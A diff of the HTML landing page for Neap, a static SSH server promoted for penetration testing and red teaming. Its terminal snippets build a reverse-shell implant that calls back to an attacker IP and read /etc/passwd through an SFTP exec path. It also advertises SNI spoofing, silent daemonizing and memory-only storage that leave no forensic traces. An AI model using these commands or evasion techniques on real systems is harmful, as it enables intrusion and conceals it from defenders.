@@ -1,410 +1,378 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neap — Static SSH Server</title>
-    <meta name="description" content="Statically-linked SSH server for penetration testing. Reverse/bind shells, SFTP, port forwarding, TLS wrapping with SNI spoofing.">
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext x='16' y='24' text-anchor='middle' font-family='Inter,sans-serif' font-size='24' font-weight='800' fill='%2374c7ec'%3EN%3C/text%3E%3C/svg%3E">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        :root{
-            --accent1:#74c7ec;--accent2:#b4befe;--accentmid:#89b4fa;
-            --accentrgb:116,199,236;
-            --text:#cdd6f4;--sub1:#bac2de;--sub0:#a6adc8;
-            --ov2:#9399b2;--ov1:#7f849c;--ov0:#6c7086;
-            --sf2:#585b70;--sf1:#45475a;--sf0:#313244;
-            --base:#1e1e2e;--mantle:#181825;--crust:#11111b;
-            --green:#a6e3a1;--yellow:#f9e2af;--red:#f38ba8;
-            --peach:#fab387;--mauve:#cba6f7;--teal:#94e2d5;
-        }
-        body{font-family:'Inter',system-ui,sans-serif;background:var(--crust);color:var(--text);line-height:1.7;overflow-x:hidden}
-        ::selection{background:rgba(var(--accentrgb),0.3);color:var(--text)}
-        .container{max-width:1140px;margin:0 auto;padding:0 28px}
-        code{font-family:'JetBrains Mono',monospace;background:var(--mantle);padding:2px 7px;border-radius:3px;font-size:.88em;color:var(--green)}
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Neap / Static SSH server</title>
+<meta name="description" content="Static SSH server for pentesting. Reverse/bind shells, PTY, SFTP, port forwarding, TLS/SNI masquerading. Rust-built, single binary.">
+<meta property="og:title" content="Neap — Static SSH server">
+<meta property="og:description" content="SSH · reverse/bind shells · SFTP · port forwarding · TLS/SNI · Rust · single binary">
+<meta property="og:image" content="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/social-preview.png">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%231e1e2e'/%3E%3Ctext x='16' y='23' text-anchor='middle' font-family='Inter,sans-serif' font-size='20' font-weight='800' fill='%23cdd6f4'%3EN%3Ctspan fill='%2374c7ec'%3E.%3C/tspan%3E%3C/text%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --base:#1e1e2e;--mantle:#181825;--crust:#11111b;
+  --sf0:#313244;--sf1:#45475a;--sf2:#585b70;
+  --ov0:#6c7086;--ov1:#7f849c;--ov2:#9399b2;
+  --sub0:#a6adc8;--sub1:#bac2de;--text:#cdd6f4;
+  --mauve:#cba6f7;--lav:#b4befe;--blue:#89b4fa;--sky:#89dceb;
+  --teal:#94e2d5;--green:#a6e3a1;--yellow:#f9e2af;--peach:#fab387;--red:#f38ba8;
+  --accent:#74c7ec; /* Neap's sky blue */
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--crust);color:var(--text);
+  font-family:'Inter',system-ui,-apple-system,sans-serif;
+  font-size:15px;line-height:1.5;
+}
+::selection{background:var(--accent);color:var(--crust)}
+a{color:inherit;text-decoration:none}
+.mono{font-family:'JetBrains Mono','SF Mono',monospace}
 
-        /* ── Nav ── */
-        .nav{position:fixed;top:0;left:0;right:0;height:56px;background:rgba(17,17,27,0.8);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid rgba(49,50,68,0.5);z-index:1000;display:flex;align-items:center;justify-content:center}
-        .nav-inner{max-width:1140px;width:100%;padding:0 28px;display:flex;align-items:center;justify-content:space-between}
-        .nav-logo{font-family:'Inter',sans-serif;font-size:16px;font-weight:700;color:var(--text);text-decoration:none}
-        .nav-links{display:flex;align-items:center;gap:28px}
-        .nav-links a{font-size:13px;font-weight:500;color:var(--ov0);text-decoration:none;transition:color .2s}
-        .nav-links a:hover{color:var(--text)}
-        .nav-cta{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:7px 18px;border-radius:8px;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
-        .nav-cta:hover{box-shadow:0 0 20px rgba(var(--accentrgb),0.3);transform:translateY(-1px)}
+/* ─── Top status bar ─────────────────────────────── */
+.status{
+  background:var(--crust);border-bottom:1px solid var(--text);
+  padding:10px 24px;display:flex;justify-content:space-between;
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  letter-spacing:0.1em;text-transform:uppercase;color:var(--ov2);
+  position:sticky;top:0;z-index:10;
+}
+.status .left{display:flex;gap:24px;flex-wrap:wrap}
+.status .right{display:flex;gap:16px;flex-wrap:wrap}
+.status b{color:var(--accent);font-weight:700}
+.status .dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--yellow);margin-right:6px;vertical-align:middle;animation:pulse 2.5s infinite}
+.status a{color:var(--ov2);transition:color .15s}
+.status a:hover{color:var(--text)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
 
-        /* ── Hero ── */
-        .hero{padding:140px 0 80px;text-align:center;position:relative}
-        .hero::before{content:'';position:absolute;top:60px;left:50%;transform:translateX(-50%);width:800px;height:400px;background:radial-gradient(ellipse,rgba(var(--accentrgb),0.08) 0%,transparent 60%);pointer-events:none}
-        .hero-logo{position:relative;max-width:600px;margin:0 auto 32px}
-        .hero-logo img{width:100%;height:auto}
-        .hero-tagline{position:relative;font-size:clamp(24px,3.5vw,38px);font-weight:700;line-height:1.2;margin-bottom:16px;background:linear-gradient(135deg,var(--accent1),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-        .hero-desc{position:relative;font-size:16px;color:var(--ov0);max-width:560px;margin:0 auto 32px}
-        .hero-ctas{position:relative;display:flex;gap:12px;justify-content:center;margin-bottom:48px}
-        .btn-primary{background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);padding:12px 28px;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;text-decoration:none;transition:box-shadow .2s,transform .2s}
-        .btn-primary:hover{box-shadow:0 0 24px rgba(var(--accentrgb),0.35);transform:translateY(-2px)}
-        .btn-secondary{background:var(--sf0);color:var(--text);padding:12px 28px;border-radius:8px;border:1px solid var(--sf1);font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:500;text-decoration:none;transition:all .2s}
-        .btn-secondary:hover{background:var(--sf1);border-color:var(--sf2)}
+/* ─── Hero ─────────────────────────────────────── */
+.hero{
+  border-bottom:1px solid var(--text);
+  padding:64px 24px 0;
+}
+.hero-inner{max-width:1280px;margin:0 auto}
+.hero .pop{
+  font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:12px;font-weight:500;color:var(--ov1);
+  letter-spacing:0.1em;text-transform:uppercase;
+  display:block;margin-bottom:24px;
+}
+.hero h1{
+  font-family:'Inter',sans-serif;
+  font-size:clamp(72px,14vw,200px);
+  line-height:0.85;font-weight:800;
+  letter-spacing:-0.05em;color:var(--text);
+  margin-bottom:32px;
+}
+.hero h1 .dot{color:var(--accent)}
+.hero-grid{
+  display:grid;grid-template-columns:1fr 1fr 1fr 1fr;
+  gap:0;border-top:1px solid var(--sf1);
+}
+.hero-grid > div{padding:20px 24px;border-right:1px solid var(--sf1)}
+.hero-grid > div:last-child{border-right:none}
+.hero-grid .label{
+  font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:10px;color:var(--ov0);
+  letter-spacing:0.18em;text-transform:uppercase;margin-bottom:8px;
+}
+.hero-grid .value{
+  font-family:'Inter',sans-serif;
+  font-size:28px;font-weight:700;color:var(--text);
+  letter-spacing:-0.02em;
+}
+.hero-grid .value .unit{color:var(--accent);font-size:0.55em;font-weight:600;margin-left:2px}
 
-        /* ── Terminal ── */
-        .terminal{position:relative;max-width:800px;margin:0 auto;background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.5),0 0 24px rgba(var(--accentrgb),0.06)}
-        .terminal-bar{background:var(--crust);padding:12px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--sf0)}
-        .terminal-dot{width:12px;height:12px;border-radius:50%}
-        .terminal-dot:nth-child(1){background:var(--red)}
-        .terminal-dot:nth-child(2){background:var(--yellow)}
-        .terminal-dot:nth-child(3){background:var(--green)}
-        .terminal-label{flex:1;text-align:center;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ov0)}
-        .terminal-body{padding:24px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.9;text-align:left}
-        .terminal-body pre{margin:0;white-space:pre-wrap;word-wrap:break-word}
-        .t-g{color:var(--green)}.t-b{color:var(--accent1)}.t-m{color:var(--sub0)}.t-p{color:var(--peach)}
+/* ─── Modular grid layout ─────────────────────── */
+.grid{
+  display:grid;grid-template-columns:1fr 1fr;
+  border-bottom:1px solid var(--sf1);
+}
+.cell{
+  padding:48px 32px;border-right:1px solid var(--sf1);position:relative;
+}
+.cell:last-child{border-right:none}
+.cell.full{grid-column:1/-1;border-right:none}
+.cell-header{
+  display:flex;justify-content:space-between;align-items:center;
+  margin-bottom:24px;padding-bottom:14px;
+  border-bottom:1px dashed var(--sf1);
+}
+.cell-num{
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  color:var(--accent);letter-spacing:0.15em;font-weight:700;
+}
+.cell-name{
+  font-family:'Inter',sans-serif;font-size:13px;color:var(--ov2);
+  letter-spacing:0.2em;text-transform:uppercase;font-weight:500;
+}
+.cell h2{
+  font-size:36px;line-height:1.05;font-weight:700;
+  letter-spacing:-0.025em;margin-bottom:16px;
+}
+.cell h2 mark{background:var(--accent);color:var(--crust);padding:0 6px;font-style:normal}
+.cell p{color:var(--sub0);font-size:16px;line-height:1.65;margin-bottom:14px}
+.cell p strong{color:var(--text);font-weight:600}
+.cell p code{
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:13px;
+  background:var(--mantle);padding:2px 7px;border-radius:3px;color:var(--green);
+}
 
-        /* ── Stats ── */
-        .stats{display:flex;justify-content:center;gap:40px;padding:60px 0;position:relative}
-        .stat{text-align:center}
-        .stat-num{font-family:'JetBrains Mono',monospace;font-size:36px;font-weight:700;color:var(--accent1);line-height:1}
-        .stat-label{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--sf2);margin-top:6px;letter-spacing:2px;text-transform:uppercase}
-        .stat-div{width:1px;height:48px;background:var(--sf0);align-self:center}
+/* Spec table — KEY → VALUE */
+.feat{
+  display:grid;grid-template-columns:auto 1fr;
+  gap:18px 24px;margin-top:24px;
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:13px;
+}
+.feat .k{color:var(--accent);font-weight:700;letter-spacing:0.05em}
+.feat .v{color:var(--sub1);line-height:1.65}
+.feat .v b{color:var(--text);font-weight:600}
 
-        /* ── Sections ── */
-        section{padding:80px 0}
-        .section-label{font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;color:var(--accent1);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
-        .section-title{font-size:clamp(28px,4vw,40px);font-weight:700;margin-bottom:12px;letter-spacing:-.02em}
-        .section-desc{font-size:15px;color:var(--ov0);margin-bottom:48px;max-width:560px}
-        .gradient-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin:0 auto;max-width:600px}
+/* Code block */
+pre.code{
+  background:var(--mantle);border:1px solid var(--text);
+  border-left:6px solid var(--accent);padding:20px 24px;
+  font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:13px;line-height:1.85;color:var(--sub1);
+  overflow-x:auto;margin-top:20px;
+}
+pre.code .c{color:var(--ov0)}
+pre.code .k{color:var(--mauve);font-weight:500}
+pre.code .s{color:var(--green)}
+pre.code .p{color:var(--peach)}
+pre.code .v{color:var(--blue)}
 
-        /* ── Bento ── */
-        .bento{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
-        .bento-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:all .25s;position:relative;overflow:hidden}
-        .bento-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent1),var(--accent2));opacity:0;transition:opacity .25s}
-        .bento-card:hover{transform:translateY(-3px);border-color:var(--sf1);box-shadow:0 12px 32px rgba(0,0,0,0.25),0 0 20px rgba(var(--accentrgb),0.06)}
-        .bento-card:hover::before{opacity:1}
-        .bento-hero{grid-column:span 2}
-        .bento-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--accent1);margin-bottom:8px}
-        .bento-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
-        .bento-card .mini-terminal{background:var(--crust);border-radius:8px;padding:14px;margin-top:14px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8;text-align:left}
-        .bento-stat{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
-        .bento-stat .big{font-family:'JetBrains Mono',monospace;font-size:42px;font-weight:700;color:var(--accent1)}
-        .bento-stat .label{font-size:12px;color:var(--sf2);margin-top:4px;letter-spacing:1px}
+/* Reference / --help block */
+.ref{
+  background:var(--mantle);border:1px solid var(--sf0);
+  padding:24px 28px;font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:13px;line-height:1.85;color:var(--sub1);
+  overflow-x:auto;margin-top:20px;border-radius:0;
+}
+.ref h4{
+  font-size:10px;color:var(--ov0);letter-spacing:0.18em;
+  text-transform:uppercase;font-weight:600;margin:14px 0 8px;
+}
+.ref h4:first-child{margin-top:0}
+.ref code{color:var(--mauve);font-weight:500;display:inline-block;width:170px}
+.ref .desc{color:var(--sub1)}
 
-        /* ── Pills ── */
-        .pills{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px}
-        .pill{background:var(--mantle);border:1px solid var(--sf0);border-radius:20px;padding:9px 18px;font-family:'JetBrains Mono',monospace;font-size:12px;display:flex;align-items:center;gap:8px;transition:all .2s;color:var(--sub0)}
-        .pill:hover{border-color:var(--sf1);background:var(--base)}
-        .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
-        .dot-g{background:var(--green)}.dot-y{background:var(--yellow)}.dot-n{background:var(--sf2)}
+/* Big call to action band */
+.band{
+  background:var(--text);color:var(--crust);
+  padding:48px 32px;border-bottom:1px solid var(--text);
+  display:grid;grid-template-columns:auto 1fr auto;align-items:center;gap:32px;
+}
+.band-tag{
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  letter-spacing:0.2em;text-transform:uppercase;font-weight:600;
+}
+.band h3{
+  font-family:'Inter',sans-serif;font-weight:700;
+  font-size:32px;line-height:1.1;letter-spacing:-0.02em;
+}
+.band a.cta{
+  background:var(--crust);color:var(--text);
+  padding:16px 28px;font-family:'JetBrains Mono','SF Mono',monospace;
+  font-size:13px;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;
+  border:1px solid var(--crust);transition:all 0.15s;white-space:nowrap;
+}
+.band a.cta:hover{background:var(--accent);color:var(--crust);border-color:var(--accent)}
 
-        /* ── Arch ── */
-        .arch-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
-        .arch-card{background:var(--mantle);border:1px solid var(--sf0);border-radius:12px;padding:28px;transition:border-color .2s}
-        .arch-card:hover{border-color:var(--sf1)}
-        .arch-num{display:inline-flex;width:30px;height:30px;background:linear-gradient(135deg,var(--accent1),var(--accentmid));color:var(--crust);border-radius:50%;align-items:center;justify-content:center;font-weight:700;font-size:14px;margin-bottom:14px}
-        .arch-card h3{font-family:'JetBrains Mono',monospace;font-size:14px;font-weight:600;color:var(--teal);margin-bottom:8px}
-        .arch-card p{font-size:13.5px;color:var(--sub0);line-height:1.6}
+/* Footer */
+footer{
+  padding:32px 24px;display:flex;justify-content:space-between;
+  font-family:'JetBrains Mono','SF Mono',monospace;font-size:11px;
+  color:var(--ov0);letter-spacing:0.1em;text-transform:uppercase;flex-wrap:wrap;gap:16px;
+}
+footer a{color:var(--ov2);border-bottom:1px solid var(--sf0);transition:all .15s}
+footer a:hover{color:var(--text);border-bottom-color:var(--text)}
 
-        /* ── Two Col ── */
-        .two-col{display:grid;grid-template-columns:1fr 1fr;gap:20px}
-
-        /* ── Detection ── */
-        .detect-card{background:var(--mantle);border-radius:12px;padding:28px}
-        .detect-card h3{font-size:14px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
-        .detect-card ul{list-style:none;font-size:13px;color:var(--sub0);line-height:2.2}
-        .detect-hidden{border-left:3px solid var(--green)}.detect-hidden h3{color:var(--green)}
-        .detect-visible{border-left:3px solid var(--yellow)}.detect-visible h3{color:var(--yellow)}
-
-        /* ── Footer ── */
-        footer{padding:48px 0;margin-top:40px}
-        .footer-line{height:1px;background:linear-gradient(90deg,transparent,var(--accent1),var(--accent2),transparent);margin-bottom:48px}
-        .footer-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:32px}
-        .footer-grid h4{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);margin-bottom:14px;letter-spacing:2px;text-transform:uppercase}
-        .footer-grid ul{list-style:none}
-        .footer-grid li{margin-bottom:8px}
-        .footer-grid a{color:var(--ov2);text-decoration:none;font-size:13px;transition:color .2s}
-        .footer-grid a:hover{color:var(--accent1)}
-        .footer-grid p{font-size:13px;color:var(--ov1);line-height:1.7}
-        .footer-bottom{text-align:center;margin-top:36px;padding-top:24px;border-top:1px solid var(--sf0);font-size:12px;color:var(--ov0)}
-
-        /* ── Animate ── */
-        .animate{opacity:0;transform:translateY(24px);transition:opacity .6s ease,transform .6s ease}
-        .animate.visible{opacity:1;transform:translateY(0)}
-        .animate-scale{opacity:0;transform:translateY(24px) scale(.97);transition:opacity .8s ease,transform .8s ease}
-        .animate-scale.visible{opacity:1;transform:translateY(0) scale(1)}
-
-        /* ── Responsive ── */
-        @media(max-width:960px){.bento{grid-template-columns:1fr 1fr}.bento-hero{grid-column:span 2}.two-col,.arch-grid{grid-template-columns:1fr}.footer-grid{grid-template-columns:repeat(2,1fr)}.stats{flex-wrap:wrap;gap:24px}}
-        @media(max-width:600px){.container{padding:0 16px}.hero{padding:100px 0 48px}.bento{grid-template-columns:1fr}.bento-hero{grid-column:span 1}.stats{gap:16px}.stat-div{display:none}.nav-links a:not(.nav-cta){display:none}.footer-grid{grid-template-columns:1fr}.pills{grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}}
-
-        a:focus-visible{outline:2px solid var(--accent1);outline-offset:2px}
-    </style>
+@media (max-width:760px){
+  .hero h1{font-size:72px}
+  .hero-grid{grid-template-columns:1fr 1fr}
+  .grid{grid-template-columns:1fr}
+  .cell{border-right:none;border-bottom:1px solid var(--sf1)}
+  .cell:last-child{border-bottom:none}
+  .band{grid-template-columns:1fr;text-align:left}
+  .status{font-size:10px;padding:10px 14px}
+  .status .left,.status .right{gap:14px}
+}
+</style>
 </head>
 <body>
 
-    <!-- Nav -->
-    <nav class="nav"><div class="nav-inner">
-        <a href="#" class="nav-logo">Neap</a>
-        <div class="nav-links">
-            <a href="#features">Features</a>
-            <a href="#architecture">Architecture</a>
-            <a href="https://github.com/Real-Fruit-Snacks/Neap">GitHub</a>
-            <a href="https://github.com/Real-Fruit-Snacks/Neap/releases/latest" class="nav-cta">Download</a>
-        </div>
-    </div></nav>
+<div class="status">
+  <div class="left">
+    <span><b>NEAP</b></span>
+    <span><span class="dot"></span>STATUS · STABLE</span>
+    <span>RUST 1.70+</span>
+  </div>
+  <div class="right">
+    <a href="https://github.com/Real-Fruit-Snacks/Neap">REPO</a>
+    <a href="https://github.com/Real-Fruit-Snacks/Neap/security/advisories">SECURITY</a>
+    <a href="https://github.com/Real-Fruit-Snacks/Neap/blob/main/LICENSE">MIT</a>
+  </div>
+</div>
 
-    <!-- Hero -->
-    <section class="hero">
-        <div class="container">
-            <div class="hero-logo animate"><img src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Neap/main/docs/assets/logo-dark.svg" alt="Neap"></div>
-            <h1 class="hero-tagline animate" style="transition-delay:.1s">SSH server, single static binary</h1>
-            <p class="hero-desc animate" style="transition-delay:.2s">Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding. TLS wrapping with SNI spoofing. Build-time configuration. Rust rewrite of Undertow.</p>
-            <div class="hero-ctas animate" style="transition-delay:.3s">
-                <a href="https://github.com/Real-Fruit-Snacks/Neap/releases/latest" class="btn-primary">Download Latest</a>
-                <a href="https://github.com/Real-Fruit-Snacks/Neap" class="btn-secondary">View Source</a>
-            </div>
-            <div class="terminal animate-scale" style="transition-delay:.4s">
-                <div class="terminal-bar">
-                    <span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span>
-                    <span class="terminal-label">neap</span>
-                </div>
-                <div class="terminal-body"><pre><span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --tls --password "s3cret"
-<span class="t-b">building reverse mode (10.10.14.5:443, TLS)</span>
-<span class="t-p">target/release/neap (1.2 MB, static)</span>
-
-<span class="t-m"># On target:</span>
-<span class="t-g">$</span> ./neap
-<span class="t-b">SSH session established (PTY allocated)</span>
-
-<span class="t-m"># SFTP transfer:</span>
-<span class="t-g">$</span> sftp -P 443 user@target
-<span class="t-b">Connected to target.</span></pre></div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Stats -->
-    <div class="container">
-        <div class="stats animate">
-            <div class="stat"><div class="stat-num" data-target="2">0</div><div class="stat-label">Modes</div></div>
-            <div class="stat-div"></div>
-            <div class="stat"><div class="stat-num" data-target="3">0</div><div class="stat-label">Forwarding</div></div>
-            <div class="stat-div"></div>
-            <div class="stat"><div class="stat-num" data-target="2">0</div><div class="stat-label">Platforms</div></div>
-            <div class="stat-div"></div>
-            <div class="stat"><div class="stat-num" data-suffix="MB" data-target="1" data-prefix="~">0</div><div class="stat-label">Binary</div></div>
-            <div class="stat-div"></div>
-            <div class="stat"><div class="stat-num" data-target="0">0</div><div class="stat-label">Dependencies</div></div>
-        </div>
-        <div class="gradient-line"></div>
+<section class="hero">
+  <div class="hero-inner">
+    <span class="pop">Real-Fruit-Snacks &nbsp;//&nbsp; network tunneling &nbsp;//&nbsp; stable release</span>
+    <h1>NEAP<span class="dot">.</span></h1>
+    <div class="hero-grid">
+      <div>
+        <div class="label">shells</div>
+        <div class="value">reverse<span class="unit"> · bind</span></div>
+      </div>
+      <div>
+        <div class="label">sftp</div>
+        <div class="value">full<span class="unit"> support</span></div>
+      </div>
+      <div>
+        <div class="label">size</div>
+        <div class="value">~1.2<span class="unit"> MB</span></div>
+      </div>
+      <div>
+        <div class="label">stack</div>
+        <div class="value">Rust<span class="unit"> 1.70+</span></div>
+      </div>
     </div>
+  </div>
+</section>
 
-    <!-- Features Bento -->
-    <section id="features">
-        <div class="container">
-            <div class="section-label animate">FEATURES</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">SSH operations in a single binary</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Reverse and bind shells with full PTY. SFTP transfers. Local, remote, and SOCKS5 forwarding. TLS wrapping.</p>
+<div class="grid">
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">01</span>
+      <span class="cell-name">Premise</span>
+    </div>
+    <h2>SSH server that operates <mark>quietly</mark> in the background.</h2>
+    <p>Neap is a static SSH server for red team engagements. Reverse shells, bind shells, SFTP, port forwarding, and TLS/SNI masquerading — all in a single ~1.2MB binary.</p>
+    <p>Built for <strong>minimal detection footprint</strong> while maintaining full SSH protocol compatibility and feature set.</p>
+  </div>
 
-            <div class="bento">
-                <div class="bento-card bento-hero animate" style="transition-delay:.1s">
-                    <h3>Reverse Shell</h3>
-                    <p>Dial home to attacker with full PTY support. Linux openpty and Windows ConPTY. All parameters baked at build time — no flags needed on target.</p>
-                    <div class="mini-terminal"><span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443<br><span class="t-m"># On target, just run:</span><br><span class="t-g">$</span> ./neap<br><span class="t-b">SSH session active — Ctrl+C to disconnect</span></div>
-                </div>
-                <div class="bento-card bento-stat animate" style="transition-delay:.18s">
-                    <div class="big">~1<span style="font-size:24px">MB</span></div>
-                    <div class="label">Static Binary</div>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.2s">
-                    <h3 style="color:var(--mauve)">Bind Shell</h3>
-                    <p>Listen for incoming SSH connections on any port. Full PTY, SFTP subsystem, and port forwarding available to connecting clients.</p>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.28s">
-                    <h3 style="color:var(--green)">SFTP Transfer</h3>
-                    <p>Full SFTP subsystem over the SSH channel. Upload and download files through any standard SFTP client.</p>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.36s">
-                    <h3 style="color:var(--peach)">Relay & SOCKS5</h3>
-                    <p>Port forwarding, multi-hop chain relay, and proxychains-compatible SOCKS5 proxy server.</p>
-                </div>
-                <div class="bento-card bento-stat animate" style="transition-delay:.1s">
-                    <div class="big" style="color:var(--teal)">0</div>
-                    <div class="label">Dependencies</div>
-                </div>
-                <div class="bento-card bento-hero animate" style="transition-delay:.18s">
-                    <h3 style="color:var(--red)">TLS Wrapping</h3>
-                    <p>Wrap SSH traffic in TLS with configurable SNI spoofing. Traffic blends with normal HTTPS. Build-time flag — no runtime configuration needed on target.</p>
-                    <div class="mini-terminal"><span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --tls<br><span class="t-b">TLS + SNI spoofing enabled</span><br><span class="t-m">traffic appears as normal HTTPS — padding 256B, jitter 50-150ms</span></div>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.26s">
-                    <h3 style="color:var(--yellow)">Build-Time Config</h3>
-                    <p>All connection parameters embedded at compile time. Target binary auto-connects with zero flags. Password, TLS, port — all baked in.</p>
-                </div>
-                <div class="bento-card bento-hero animate" style="transition-delay:.32s">
-                    <h3 style="color:var(--accent1)">SFTP Shell (/exec/)</h3>
-                    <p>Execute commands through any standard SFTP client. Access paths under <code>/exec/</code> and Neap runs the command, returning output as file content. Works with OpenSSH, WinSCP, FileZilla, scp, curl — no custom tooling.</p>
-                    <div class="mini-terminal"><span class="t-g">sftp&gt;</span> get /exec/whoami /dev/stdout<br><span class="t-b">root</span><br><span class="t-g">sftp&gt;</span> get "/exec/cat /etc/passwd" /dev/stdout<br><span class="t-b">root:x:0:0:root:/root:/bin/bash</span></div>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.38s">
-                    <h3 style="color:var(--teal)">Auto-Daemonize</h3>
-                    <p>Automatically backgrounds on launch. Unix double-fork with full terminal detach. Windows detached respawn. Zero visible process window. Silent by default.</p>
-                </div>
-                <div class="bento-card animate" style="transition-delay:.38s">
-                    <h3 style="color:var(--mauve)">In-Memory SFTP</h3>
-                    <p>RAM-only file storage with <code>--memfs</code>. Files never touch disk. Zero forensic artifacts. All data lost on exit — by design.</p>
-                    <div class="mini-terminal"><span class="t-g">$</span> ./build.sh reverse 10.10.14.5:443 --memfs<br><span class="t-b">in-memory SFTP enabled (no disk artifacts)</span><br><span class="t-m">uploads/downloads stored in RAM only</span></div>
-                </div>
-            </div>
-        </div>
-    </section>
+  <div class="cell">
+    <div class="cell-header">
+      <span class="cell-num">02</span>
+      <span class="cell-name">Specs</span>
+    </div>
+    <h2>What's in the box.</h2>
+    <div class="feat">
+      <div class="k">SHELLS</div><div class="v"><b>Reverse · bind shells</b> with full PTY support and session management.</div>
+      <div class="k">TRANSPORT</div><div class="v"><b>TLS/SNI masquerading</b> — appears as HTTPS traffic on the wire.</div>
+      <div class="k">SFTP</div><div class="v">Full SFTP server support for <b>file transfers</b> and remote filesystem access.</div>
+      <div class="k">FORWARDING</div><div class="v"><b>Local · remote · dynamic</b> port forwarding with SOCKS5 proxy.</div>
+      <div class="k">EXECUTION</div><div class="v"><b>Fileless execution</b> — run from memory without touching disk.</div>
+      <div class="k">STACK</div><div class="v">Pure Rust · tokio async · static linking · cross-platform builds.</div>
+    </div>
+  </div>
+</div>
 
-    <!-- Capabilities -->
-    <section style="background:var(--mantle)">
-        <div class="container">
-            <div class="section-label animate">CAPABILITIES</div>
-            <h2 class="section-title animate" style="transition-delay:.08s">Capabilities</h2>
-            <p class="section-desc animate" style="transition-delay:.16s">Full SSH operations on Linux and Windows. Single static binary with zero runtime dependencies.</p>
-            <div class="pills">
-                <div class="pill animate"><span class="dot dot-g"></span>Reverse Shell</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Bind Shell</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Full PTY</div>
-                <div class="pill animate"><span class="dot dot-g"></span>SFTP</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Local Forward</div>
-                <div class="pill animate"><span class="dot dot-g"></span>Remote Forward</div>
-                <div class="pill animate"><span class="dot dot-g"></span>SOCKS5 Dynamic</div>
-                <div class="pill animate"><span class="dot dot-g"></span>TLS Wrapping</div>
